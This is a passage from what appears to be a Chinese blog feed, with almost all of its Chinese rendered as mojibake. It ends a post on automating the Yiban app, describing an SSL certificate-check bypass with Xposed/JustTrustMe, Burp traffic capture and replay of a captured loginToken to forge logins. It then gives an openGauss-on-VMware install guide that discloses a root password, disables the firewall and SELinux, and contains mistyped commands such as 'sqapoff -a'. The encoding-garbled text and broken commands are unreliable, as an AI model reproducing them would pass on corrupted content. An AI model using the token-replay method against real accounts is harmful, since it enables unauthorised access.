çš„è¯ä¹¦ï¼Œä½¿å…¶æµé‡é€šè¿‡ burpï¼Œå®ç°æ‰‹æœºæŠ“åŒ…</p><blockquote><p>Xposed æ¡†æ¶æ˜¯ä¸€æ¬¾å¼€æºæ¡†æ¶ï¼Œå…¶åŠŸèƒ½æ˜¯å¯ä»¥åœ¨ä¸ä¿®æ”¹ APK çš„æƒ…å†µä¸‹å½±å“ç¨‹åºè¿è¡Œ(ä¿®æ”¹ç³»ç»Ÿ)çš„æ¡†æ¶æœåŠ¡ï¼ŒåŸºäºå®ƒå¯ä»¥åˆ¶ä½œå‡ºè®¸å¤šåŠŸèƒ½å¼ºå¤§çš„æ¨¡å—ï¼Œä¸”åœ¨åŠŸèƒ½ä¸å†²çªçš„æƒ…å†µä¸‹åŒæ—¶è¿ä½œ</p><p>JustTrustMe ä¸€ä¸ªç”¨æ¥ç¦ç”¨ã€ç»•è¿‡ SSL è¯ä¹¦æ£€æŸ¥çš„åŸºäº Xposed æ¨¡å—ã€‚ç®€å•æ¥è¯´ï¼ŒJustTrustMe æ˜¯å°† APK ä¸­æ‰€æœ‰ç”¨äºæ ¡éªŒ SSL è¯ä¹¦çš„ API éƒ½è¿›è¡Œäº† Hookï¼Œä»è€Œç»•è¿‡è¯ä¹¦æ£€æŸ¥çš„</p></blockquote></li><li><p>æŠ“åŒ…åˆ†æå„ä¸ªåŠŸèƒ½å¯¹ api è¯·æ±‚çš„ url æ„é€ æ ¼å¼å’Œ http è¯·æ±‚å¤´çš„ä¼ªé€ æ–¹æ³•</p></li><li><p>ä½¿ç”¨é¢å‘å¯¹è±¡ç¼–ç¨‹ï¼Œå°†ä¸‰ä¸ªåŠŸèƒ½å°è£…æˆç±»ï¼Œæ–¹ä¾¿å›¢é˜Ÿè¿›è¡Œæœ€åçš„ä»£ç æ‹¼æ¥</p></li></ul><h2 id="æ¨¡æ‹Ÿç™»å½•"><a href="#æ¨¡æ‹Ÿç™»å½•" class="headerlink" title="æ¨¡æ‹Ÿç™»å½•"></a>æ¨¡æ‹Ÿç™»å½•</h2><blockquote><p>â€‹æ¨¡æ‹Ÿç™»å½•æ¨¡å—å…¶å®æ²¡æœ‰çœŸæ­£å®ç°ï¼Œç½‘é¡µç«¯ç™»å½•å·²ç»èƒ½é€šè¿‡é€†å‘åˆ†æ login.js æ–‡ä»¶æ¥è·å–æ˜“ç­å¯¹å¯†ç åœ¨å‰ç«¯çš„åŠ å¯†ç®—æ³•ï¼Œå¯ä»¥çœŸæ­£å®ç°æ¨¡æ‹Ÿç™»å½•<br>â€‹app ç«¯æ— æ³•é€šè¿‡æŠ“åŒ…æˆ–åˆ†ææ¥å£åœ°å€æ¥æ‰¾åˆ°åŠ å¯†æ–¹å¼<br>åœ¨ app é‡Œç¬¬ä¸€æ¬¡è¾“å…¥å¯†ç æˆåŠŸç™»é™†åï¼Œapp ä¼šå°† loginToken åµŒå…¥åˆ° app é‡Œï¼Œä¸‹æ¬¡æ‰“å¼€ä¼šæå–æ‹¼æ¥åˆ°è¯·æ±‚ autologin api æ¥å£çš„ url ä¸­<br>â€‹    ç›®å‰èƒ½æƒ³åˆ°çš„ app ç«¯å®ç°çœŸæ­£æ¨¡æ‹Ÿç™»å½•ä¸¤ç§æ–¹æ³•ï¼š<br>â€‹    1ã€app ç«¯åœ¨ç™»å½•æ—¶å€™å¯¹å¯†ç çš„åŠ å¯†æ˜¯åµŒåœ¨ app çš„æºç é‡Œï¼ŒçœŸè¦åšå¯ä»¥é€šè¿‡é€†å‘åˆ†æ app æºç ï¼Œæ‰¾åˆ°åŠ å¯†ä»£ç é€†å‘ç ´è§£<br>â€‹    2ã€ä½¿ç”¨ç±»ä¼¼äº seleium çš„ appium æ¥å®ç°æ¨¡æ‹ŸçœŸæ­£çš„äººè¿›è¡Œç™»å½•ï¼Œå†ä»ä¸­æå–å‡º loginToken<br>â€‹    ç›®å‰å®ç°åªèƒ½å¤Ÿæ˜¯æŠ“åŒ…æ‹¿ loginToken æ¥ç»™åˆ° autologin æ¥å£è¿›è¡Œä¼ªé€ ç™»å½•</p></blockquote><h3 id="æŠ“å–-loginToken"><a href="#æŠ“å–-loginToken" class="headerlink" title="æŠ“å– loginToken"></a>æŠ“å– loginToken</h3><ul><li>å‡è®¾å·²ç»é…ç½®å¥½äº†å®‰å“è™šæ‹Ÿæœºç¯å¢ƒï¼Œåœ¨å®‰å“è™šæ‹Ÿæœºä¸Šæ‰“å¼€æ˜“ç­ï¼ŒåŒæ—¶ç”¨ burp æŠ“åŒ…</li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210509211040.png"></p><ul><li>ä¿å­˜ä¸‹æ¥å¤åˆ¶åˆ°ä»£ç é‡Œé¢ï¼Œæ›¿æ¢æ‰æ‰€æœ‰éœ€è¦ç”¨åˆ°çš„åœ°æ–¹</li></ul><h2 id="è‡ªåŠ¨å‘å¸ƒåŠ¨æ€"><a href="#è‡ªåŠ¨å‘å¸ƒåŠ¨æ€" class="headerlink" title="è‡ªåŠ¨å‘å¸ƒåŠ¨æ€"></a>è‡ªåŠ¨å‘å¸ƒåŠ¨æ€</h2><blockquote><p>è‡ªåŠ¨å‘å¸ƒåŠ¨æ€ï¼ŒåŠ¨æ€å†…å®¹éœ€è¦è¿›è¡Œä¸€æ¬¡ url ç¼–ç <br>åŠ¨æ€å‘å¸ƒæˆåŠŸåä¼šè¿”å›ä¸€ä¸ª json ï¼Œé‡Œé¢æœ‰æ¯ä¸ªåŠ¨æ€ä¸“å±çš„ä¸€ä¸ªä¹ä½æ•°çš„å·ç <br>ä¹‹åå¯¹åŠ¨æ€è¿›è¡Œçš„ç‚¹èµã€è¯„è®ºæ“ä½œï¼Œéœ€è¦é€šè¿‡è¯¥å·ç å®šä½æ˜¯å“ªæ¡åŠ¨æ€</p></blockquote><h3 id="æŠ“åŒ…åˆ†æ"><a href="#æŠ“åŒ…åˆ†æ" class="headerlink" title="æŠ“åŒ…åˆ†æ"></a>æŠ“åŒ…åˆ†æ</h3><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210509211314.png"></p><ul><li>å‘å¸ƒåŠ¨æ€æ—¶éœ€è¦åœ¨ url ä¸­æ·»åŠ  access_token å‚æ•°ï¼Œå†…å®¹ä¸ºä¹‹å‰æŠ“å–åˆ°çš„ loginTokenï¼Œåœ¨ http è¯·æ±‚å¤´é‡Œé¢è¿˜å­˜åœ¨ä¸¤ä¸ªéœ€è¦ç”¨åˆ° loginToken çš„å¤´</li><li></li></ul><h2 id="è‡ªåŠ¨è¯„è®ºåŠ¨æ€"><a href="#è‡ªåŠ¨è¯„è®ºåŠ¨æ€" class="headerlink" title="è‡ªåŠ¨è¯„è®ºåŠ¨æ€"></a>è‡ªåŠ¨è¯„è®ºåŠ¨æ€</h2><blockquote><p>è‡ªåŠ¨ç»™åŠ¨æ€è¯„è®ºï¼Œè¯„è®ºå†…å®¹éœ€è¦è¿›è¡Œä¸€æ¬¡ url ç¼–ç ï¼Œé€šè¿‡ä¹‹å‰å‘å¸ƒå­˜å…¥ç§æœ‰å˜é‡çš„åŠ¨æ€å·ç æ¥ç¡®å®šéœ€è¦è¯„è®ºå“ªæ¡åŠ¨æ€</p></blockquote><h2 id="è‡ªåŠ¨ç‚¹èµåŠ¨æ€"><a href="#è‡ªåŠ¨ç‚¹èµåŠ¨æ€" class="headerlink" title="è‡ªåŠ¨ç‚¹èµåŠ¨æ€"></a>è‡ªåŠ¨ç‚¹èµåŠ¨æ€</h2><blockquote><p>æ‹¼æ¥éœ€è¦ç‚¹èµçš„åŠ¨æ€å·è¿›å…¥è¯·æ±‚ç‚¹èµ api çš„ url ä¸­ï¼Œè¯·æ±‚å³å¯å®Œæˆç‚¹èµ </p></blockquote>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹ ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¼€å‘ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>openGauss-VMwareå®‰è£…</title>
      <link href="/posts/36330/"/>
      <url>/posts/36330/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å†™åœ¨å‰é¢</p><p>æœ¬æ•™ç¨‹é€‚ç”¨äº 0 åŸºç¡€å°ç™½ï¼Œé‡Œé¢çš„å¾ˆå¤šå‘½ä»¤ã€æŠ€æœ¯ç»†èŠ‚æ²¡æœ‰è¿›è¡Œè§£é‡Šï¼Œå› ä¸ºé‚£æ ·è¦å¢è¡¥çš„å†…å®¹å¤ªå¤šäº†ï¼Œéƒ½æ˜¯ä¸€äº› Linux çš„ç›¸å…³çŸ¥è¯†ï¼Œè¿˜æœ‰ä¸€äº› openGauss å®˜æ–¹æ‰‹å†Œé‡Œé¢çš„å†…å®¹ï¼Œå¤ªè¿‡äºå•°å—¦</p><p>å­¦æ ¡ä¸Šçš„æ•°æ®åº“ï¼Œå®‰æ’çš„æ•°æ®åº“çš„å®éªŒè¯´è¦ç”¨åä¸ºè¿™æ¬¾å¼€æºçš„æ•°æ®åº“ï¼Œï¼ˆä¼°è®¡æ˜¯å­¦æ ¡è¿‘äº›å¹´ä¸€ç›´è·Ÿåä¸ºåˆä½œï¼‰ï¼Œå†…æ ¸æ˜¯æ‹¿ PostgreSQL å†™çš„ï¼Œè€å¸ˆç»™çš„æ•™ç¨‹æ˜¯æ‹¿ VirtualBox è½»é‡çº§çš„é‚£æ¬¾è™šæ‹Ÿæœºç®¡ç†è½¯ä»¶æ­å»ºè™šæ‹Ÿæœºè¿›è¡Œå®‰è£…çš„ï¼Œè€å¸ˆä¹Ÿå·²ç»ç»™å‡ºäº†é…å¥½çš„ è™šæ‹Ÿæœº.ovf æ–‡ä»¶ï¼Œç›´æ¥å¯¼å…¥å°±èƒ½ç”¨ï¼Œä½†æ˜¯æˆ‘è‡ªå·±å·²ç»ç”¨äº†å¥½ä¹…çš„ VMware ï¼Œä¸æƒ³å†æ›´æ¢è™šæ‹Ÿæœºè½¯ä»¶ï¼Œæ‰€ä»¥å°±ç´¢æ€§è‡ªå·±æ‰¾èµ„æ–™æ­äº†ç¯å¢ƒï¼Œä¸ç®—é¡ºåˆ©ï¼Œä½†æ˜¯ä¹Ÿå­¦åˆ°äº†ä¸å°‘ä¸œè¥¿</p><p>ç¬¬ä¸€æ¬¡æ­å¤§æ¦‚ç”¨äº†ä¸€ä¸ªå°æ—¶ï¼Œç¬¬äºŒæ¬¡è¾¹å†™æ•™ç¨‹è¾¹æ­å€’æ˜¯èŠ±äº†ä¸¤ä¸ªå°æ—¶å¤š</p><blockquote><p>2021.4.10</p><p>å¯¼å‡ºé…å¥½çš„è™šæ‹Ÿæœºï¼Œ vm å¯¼å…¥æ—¶å€™ä¼šè‡ªåŠ¨åˆ†é… ip åœ°å€ï¼Œä¹Ÿå°±æ˜¯å¦‚æœè¦ä½¿ç”¨æˆ‘å¯¼å‡ºçš„é…å¥½çš„è™šæ‹Ÿæœºï¼Œé‚£ä¹ˆ å·æ‡’è€…çš„ vm ç½‘ç»œé…ç½®å¿…é¡»æ˜¯é‡‡ç”¨é™æ€åˆ†é…ï¼Œå­ç½‘æ˜¯ 192.168.1.0ï¼ŒDHCP éœ€è¦é…ç½®é™æ€åˆ†é…åœ°å€è·Ÿå¯¼å‡ºè™šæ‹Ÿæœºçš„ ip åœ°å€ä¸€æ ·ï¼Œä¸º 192.168.1.142 ï¼Œåº”è¯¥æ˜¯èƒ½è‡ªå®šä¹‰è™šæ‹Ÿæœºçš„ ip åœ°å€çš„ï¼Œä½†æ˜¯æ²¡æœ‰ç»§ç»­å¾€ä¸‹ç ”ç©¶äº†ï¼Œå› ä¸ºå‘ç°ç”¨ docker æ­å»ºè¿™ä¸ªç¯å¢ƒä¼šæ›´åŠ ç®€å•ï¼Œä¸‹ä¸€ç¯‡åšå®¢å†™ç”¨ docker æ€ä¹ˆæ­å»º</p><blockquote><p>2021.4.11</p><p>çªç„¶æƒ³åˆ°ï¼Œå…¶å®å®‰å¥½ CentOS ä¹‹åå°±åº”è¯¥ç›´æ¥æ‹¿ xshell è¿ï¼Œç”¨ xshell çš„ç»ˆç«¯æ¥è¾“å…¥å‘½ä»¤ï¼Œè¿™æ ·å°±ä¸ç”¨æ‰‹æ‰“é‚£ä¹ˆå¤šäº†ï¼Œç›´æ¥å¤åˆ¶ç²˜è´´å°±è¡Œï¼Œä½†æ˜¯åšå®¢æ–‡ç« é‡Œå†™å¼€å§‹ç”¨åˆ° xshell åœ¨åé¢ä½ç½®ï¼ŒçœŸæ˜¯è ¢</p></blockquote></blockquote></blockquote><h1 id="å®‰è£…-CentOS-7-6"><a href="#å®‰è£…-CentOS-7-6" class="headerlink" title="å®‰è£… CentOS 7.6"></a>å®‰è£… CentOS 7.6</h1><blockquote><p>ä¸€å®šå¾—æ˜¯ CentOS-7.6 çš„ç‰ˆæœ¬ï¼Œå› ä¸ºåä¸ºå®˜æ–¹çš„æ–‡æ¡£è¦æ±‚è¿™æ ·çš„ï¼Œå¦‚æœç”¨çš„å…¶ä»–ç‰ˆæœ¬åˆ™éœ€è¦æ›´æ”¹é…ç½®</p><p>å…ˆ <code>vi /etc/redhat-releas</code> æ‰“å¼€ç¼–è¾‘æ–‡ä»¶ï¼Œç„¶åå°†å†…å®¹æ”¹ä¸º <code>CentOS Linux release 7.6.2003 (Core)</code></p><blockquote><p>æˆ‘æ²¡è¯•è¿‡ï¼Œå› ä¸ºæˆ‘ä¸‹çš„ CentOS å°±æ˜¯ 7.6 çš„ç‰ˆæœ¬ï¼Œä½†æ˜¯è€å¸ˆç»™çš„æ•™ç¨‹æ–‡æ¡£é‡Œé¢è¿™ä¹ˆå†™çš„</p></blockquote></blockquote><p>æ‰“å¼€ VMwareï¼Œåˆ›å»ºè™šæ‹Ÿæœºï¼Œåœ¨å…¶ä¸Šå®‰è£… CentOSï¼Œé€‰æ‹©åˆ›å»ºæ–°çš„è™šæ‹Ÿæœº</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410005151.png"></p><p>é€‰è‡ªå®šä¹‰ï¼Œå…¼å®¹æ€§ä¹Ÿç›´æ¥ä¸‹ä¸€æ­¥ï¼Œ<strong>é€‰ç¨åå®‰è£…æ“ä½œç³»ç»Ÿ</strong></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410005240.png"></p><p>è™šæ‹Ÿæœºåç§°ï¼Œå­˜æ”¾ä½ç½®è‡ªå·±é€‰ï¼Œ<strong>å¤„ç†å™¨å’Œå†…æ ¸æ•°é‡éƒ½é€‰ä¸€ä¸ªï¼Œå†…å­˜è¦ç»™ 4gï¼Œä¸ç„¶å¯èƒ½å‡ºç°æŠ¥é”™</strong></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410005332.png"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410005340.png"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410005351.png"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410005400.png"></p><p>ç£ç›˜ç»™ 20-40g ï¼Œ<strong>å°†è™šæ‹Ÿç£ç›˜å­˜å‚¨ä¸ºå•ä¸ªæ–‡ä»¶ï¼Œè¿™ä¸ªæ¯”è¾ƒæ–¹ä¾¿</strong></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410005430.png"></p><p>å› ä¸ºä¸æ˜¯ä¸€æ¬¡åˆ†é…ï¼Œæ‰€ä»¥ç©ºé—´è®¾ç½®å¤§äº›ï¼Œç½‘ä¼  openGauss å®‰è£…æœ‰è‡³å°‘ 20g ç©ºé—´è¦æ±‚ã€‚</p><p>è®¾ç½®ä¸ºå•ä¸ªæ–‡ä»¶ï¼Œæ¯”è¾ƒæ–¹ä¾¿ã€‚</p><p><strong>ç‚¹è‡ªå®šä¹‰ç¡¬ä»¶</strong>ï¼Œå†ç‚¹<code>å¤„ç†å™¨</code>ï¼Œè™šæ‹ŸåŒ–å…¨éƒ¨å‹¾ä¸Šï¼Œå†ç‚¹<code>æ–° CD/DVD</code> ï¼Œä½¿ç”¨å‹ç¼©åŒ…å†…çš„é•œåƒï¼Œå†åˆ é™¤<code>æ‰“å°æœºå’Œå£°å¡</code></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410005447.png"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410005456.png"></p><p>ç‚¹å…³é—­ï¼Œç‚¹å®Œæˆï¼Œæ¥ç€å¼€å¯è™šæ‹Ÿæœº</p><p>è¿™ä¸ªç•Œé¢æ–¹å‘ç›˜é”®é€‰ä¸­ç¬¬ä¸€ä¸ªç„¶åç›´æ¥æŒ‰ <strong><code>enter</code></strong></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410005511.png"></p><p>ä¸‹é¢å°±ä¸€ç‚¹ç‚¹è¿›è¡Œè®¾ç½®</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410005540.png"></p><p>è®¾ç½®æ—¶é—´ï¼Œ<strong>ç‚¹ä¸€ä¸‹ç¬¬ä¸€ä¸ªæ—¶é’Ÿç„¶åç‚¹ä¸€ä¸‹äºšæ´²å¤§é™†ï¼Œç„¶åç‚¹å®Œæˆ</strong></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410005645.png"></p><p><strong>ç‚¹ä¸€ä¸‹å®‰è£…ä½ç½®ç„¶åç‚¹å®Œæˆé€€å‡ºæ¥ï¼Œé»˜è®¤è®¾ç½®å°±è¡Œï¼Œå†ç‚¹ â€œç½‘ç»œå’Œä¸»æœºåâ€ï¼Œæ‰“å¼€ä»¥å¤ªç½‘çš„å¼€å…³</strong></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410005658.png"></p><p><strong>ä¸»æœºåå­—è‡ªå·±å®šä¸€ä¸ªï¼Œè¦è®°ä½ï¼Œå¾ˆé‡è¦ï¼Œ<code>ip</code> åœ°å€ä¹Ÿè¦è®°ä½ï¼Œä¹Ÿå¾ˆé‡è¦</strong></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410005711.png"></p><p>ä¸Šå›¾çš„ä¿¡æ¯å¾ˆé‡è¦ï¼Œåœ¨ openGauss å®‰è£…çš„æ—¶å€™ï¼Œ<code>clusterconfig.xml</code> ä¸­çš„ä¸€äº›å€¼ä¾¿éœ€è¦ç”¨åˆ°æ˜¯ä¸Šè¿°ä¿¡æ¯ï¼Œ<code>ip</code> åœ°å€å’Œ <code>hostname</code> ï¼Œè¿™é‡Œçš„ <code>ip</code> åœ°å€æ˜¯ <code>192.168.1.142</code>ï¼Œ<code>hostname</code> æ˜¯ <code>Aimerl0</code>ï¼Œç„¶åç‚¹å¼€å§‹å®‰è£…</p><p>å¼€å§‹é…ç½® root å¯†ç ï¼Œå¯†ç æ˜¯ï¼š<code>010625.</code>ï¼ˆæœ‰ä¸ªç‚¹ï¼‰ï¼Œé…ç½®å®Œä»¥åå°±å¼€å§‹è‡ªåŠ¨å®‰è£…äº†ï¼Œç­‰å¾…å®Œæˆå³å¯ï¼Œå®‰è£…å®Œæˆï¼Œ<code>reboot</code> é‡å¯å°±å¯ä»¥äº†</p><h1 id="å®‰è£…-openGauss"><a href="#å®‰è£…-openGauss" class="headerlink" title="å®‰è£… openGauss"></a>å®‰è£… openGauss</h1><p>å¯åŠ¨ CentOSï¼Œç”¨ root è´¦æˆ·ä»¥åŠå¯†ç  <code>010625.</code> ç™»å½•åï¼Œå°±å¯ä»¥è¿›è¡Œ openGauss çš„å®‰è£…äº†ï¼Œåœ¨å…³é”®æˆ–è€…ä½ ä¸æ˜¯å¾ˆç¡®å®šçš„åœ°æ–¹ï¼Œç‚¹å‡»è™šæ‹Ÿæœºå·¦ä¸Šè§’çš„å»ºç«‹å¿«ç…§ï¼Œå¦‚æœåç»­å‡ºé—®é¢˜äº†æ¢å¤å¿«ç…§</p><p>å…³é—­é˜²ç«å¢™å’Œç¦ç”¨é˜²ç«å¢™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl stop firewalld.service</span><br><span class="line">systemctl disable firewalld.service</span><br></pre></td></tr></table></figure><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410010200.png"></p><p>ä¹‹åè¾“å…¥å‘½ä»¤ï¼Œè¿›å…¥æ–‡æ¡£ç¼–è¾‘çŠ¶æ€ï¼ŒæŒ‰é”®ç›˜ä¸Šé¢çš„ i é”® ï¼Œç„¶åå°±å¯ä»¥å¯¹æ–‡æ¡£è¿›è¡Œç¼–è¾‘ï¼Œç¼–è¾‘åä¸º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/selinux/config</span><br></pre></td></tr></table></figure><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410010335.png"></p><p>ç¼–è¾‘ç»“æŸï¼Œéœ€è¦ä¿å­˜ï¼Œä¿å­˜çš„æ–¹å¼ä¸ºï¼Œå…ˆæŒ‰é”®ç›˜ä¸Šçš„ <code>esc</code> é”®ï¼Œç„¶ååœ¨å±å¹•ä¸‹æ–¹è¾“å…¥<code>:wq</code>å³å¯ï¼Œå¦‚æœç¼–è¾‘é”™è¯¯ï¼Œä¸æƒ³ä¿å­˜ï¼Œåˆ™è¾“å…¥çš„æ˜¯<code>:q!</code>ï¼Œæ³¨æ„éƒ½æ˜¯è‹±æ–‡å­—ç¬¦ã€‚</p><p>ç„¶åé‡å¯ï¼Œè¾“å…¥ <code>reboot</code></p><p>é‡å¯åï¼Œç”¨è´¦å· <code>root</code>ï¼Œå¯†ç  <code>010625.</code> ç™»å½•åç»§ç»­è®¾ç½®ï¼Œå…ˆå…³é—­å†…å­˜äº¤æ¢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqapoff -a</span><br></pre></td></tr></table></figure><p>ç„¶åå®‰è£… <code>ifconfig</code> çš„ç»„ä»¶ï¼Œè¾“å…¥ <code>yum install net-tools.x86_64</code>ï¼Œè‡ªåŠ¨ä¸‹è½½å®‰è£…åŒ…ï¼Œ<strong>å¦‚æœæœ‰é—®å¡« y è¿˜æ˜¯nï¼Œéƒ½æ˜¯ y</strong></p><p>å®‰è£…å®Œæˆåï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ <code>ifconfig</code> å‘½ä»¤äº†</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410010610.png"></p><p>ä¸‹é¢æµ‹è¯• root è¿œç¨‹ç™»å½•ã€‚å‘½ä»¤ï¼š<code>ssh â€œä½ çš„ipï¼Œç”¨ifconfigæŸ¥â€</code></p><p>è¾“å…¥å¯†ç åï¼Œéœ€è¦ç­‰å¾…ä¸€ä¸‹ï¼Œæµ‹è¯•ç™»å½•æˆåŠŸ</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410010633.png"></p><p>ä¸‹é¢éœ€è¦è”ç½‘å‡çº§å®‰è£… python3.6 ï¼Œå‘½ä»¤ï¼š<code>yum install python3</code>ï¼Œé‡åˆ°é—®é¢˜å°±é€‰ <strong>y</strong></p><p>ç»§ç»­å®‰è£…å‹ç¼©è½¯ä»¶ï¼Œè¾“å…¥å‘½ä»¤ï¼š<code>yum install bzip2</code></p><p>ç„¶åä¸€æ­¥å®‰è£…ç›¸å…³çš„åŒ…ï¼Œå‘½ä»¤ï¼š<code>yum install -y libaio-devel flex bison ncurses-devel glibc.devel patch lsb_release wget</code></p><p>åšä¸ªå¿«ç…§ï¼Œéšä¾¿èµ·ä¸ªè®°å½•å½“å‰å¹²äº†ä»€ä¹ˆçš„å</p><p>ä¸‹é¢éœ€è¦å°†ä¸€ä¸ªé‡è¦çš„ï¼Œåœ¨å®‰è£…è¿‡ç¨‹ä¸­ä¼šå¤šæ¬¡ç”¨åˆ°çš„é…ç½®æ–‡ä»¶æ”¾åˆ°è™šæ‹Ÿæœºä¸­ï¼Œè¯¥é…ç½®æ–‡ä»¶åä¸º <code>clusterconfig.xml</code></p><p>éœ€è¦ä¿®æ”¹çš„å†…å®¹æ˜¯æ ‡å‡ºæ¥çš„å†…å®¹ï¼Œä¸€ä¸ªæ˜¯<code>ä¸»æœºå</code>ï¼Œä¸€ä¸ªæ˜¯<code> ip åœ°å€</code>ï¼Œéƒ½æ˜¯ä¹‹å‰é…ç½®è¿‡çš„ï¼Œ<code>Aimerl0</code> å’Œ <code>192.168.1.142</code></p><p>åœ¨ <code>/opt/software/openGauss/</code>è·¯å¾„ä¸‹åˆ›å»º XML é…ç½®æ–‡ä»¶ï¼Œç”¨äºæ•°æ®åº“å®‰è£…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@Aimerl0 openGauss]# vi clusterconfig.xml</span><br></pre></td></tr></table></figure><p>ç„¶åæŠŠä¸‹é¢çš„å†…å®¹å¤åˆ¶ï¼Œç²˜è´´åˆ° vi æ‰“å¼€çš„ <code>clusterconfig.xml</code> ä¸­ï¼ŒæŒ‰ i é”®åˆ‡æ¢åˆ°ç¼–è¾‘æ¨¡å¼ï¼Œå¤åˆ¶å†…å®¹é»è´´åˆ°æ–‡æ¡£ä¸­ï¼Œç„¶åæŒ‰ä¸‹ esc é”®é€€å‡ºç¼–è¾‘æ¨¡å¼ï¼Œç„¶åè¾“å…¥<code>:wq</code>é€€å‡ºå¹¶è¿›è¡Œä¿å­˜</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;nodeNames&quot;</span> <span class="attr">value</span>=<span class="string">&quot; Aimerl0&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Aimerl0&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;backIp1s&quot;</span> <span class="attr">value</span>=<span class="string">&quot;192.168.1.142&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;backIp1&quot;</span> <span class="attr">value</span>=<span class="string">&quot;192.168.1.142&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;sshIp1&quot;</span> <span class="attr">value</span>=<span class="string">&quot;192.168.1.142&quot;</span>/&gt;</span></span><br><span class="line">ä¸‹é¢çš„æ–‡æ¡£æ˜¯å…¨æ–‡ï¼Œè¿™é‡Œä¸Šé¢çš„ä¸œè¥¿åªæ˜¯æ ‡å‡ºéœ€è¦å¯¹ç…§ä¿®æ”¹çš„åœ°æ–¹ï¼Œæ–¹ä¾¿çœ‹ã€‚</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ROOT</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- openGaussæ•´ä½“ä¿¡æ¯ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">CLUSTER</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;clusterName&quot;</span> <span class="attr">value</span>=<span class="string">&quot;dbCluster&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;nodeNames&quot;</span> <span class="attr">value</span>=<span class="string">&quot; Aimerl0&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;backIp1s&quot;</span> <span class="attr">value</span>=<span class="string">&quot;192.168.1.142&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;gaussdbAppPath&quot;</span> <span class="attr">value</span>=<span class="string">&quot;/opt/huawei/install/app&quot;</span>/&gt;</span></span><br><span class="line"><span 